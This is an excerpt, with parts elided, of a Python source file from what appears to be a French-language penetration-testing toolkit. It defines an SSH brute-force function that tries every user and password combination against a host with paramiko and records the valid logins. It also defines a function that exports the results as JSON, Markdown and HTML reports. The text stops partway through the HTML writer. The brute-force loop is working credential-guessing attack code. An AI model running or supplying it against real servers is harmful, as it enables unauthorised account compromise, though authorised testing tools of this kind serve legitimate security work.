...
def ssh_bruteforce(host, port=22, userlist=None, passlist=None, timeout=5, delay=0.5, max_attempts=5):
    """
    Brute-force SSH avancé : gestion timing, erreurs, export pro.
    ...
    for user in userlist:
        for pwd in passlist:
            ...
            try:
                ...
                ssh.connect(host, port=port, username=user, password=pwd, timeout=timeout, banner_timeout=timeout, auth_timeout=timeout, allow_agent=False, look_for_keys=False)
                valid.append({'user': user, 'password': pwd})
                results.append({'user': user, 'password': pwd, 'status': 'success'})
                ssh.close()
            except paramiko.AuthenticationException:
                results.append({'user': user, 'password': pwd, 'status': 'fail'})
...
def export_ssh_bruteforce_results(data, export_base):
    """
    Exporte les résultats du brute-force SSH en JSON, Markdown, HTML.
    """
    meta = data.get('meta', {})
    ...
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "bruteforce_ssh")
    ...
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport Brute-force SSH\n\n")
    ...
    with open(export_base + '.html', 'w', encoding='utf-8') as f:
        f.write(f"<html><head><meta charset='utf-8'><title>Rapport Brute-force SSH</title></head><body>")
        f.write(f"<h1>Rapport Brute-force SSH</h1>")
        for k, v in meta.items():
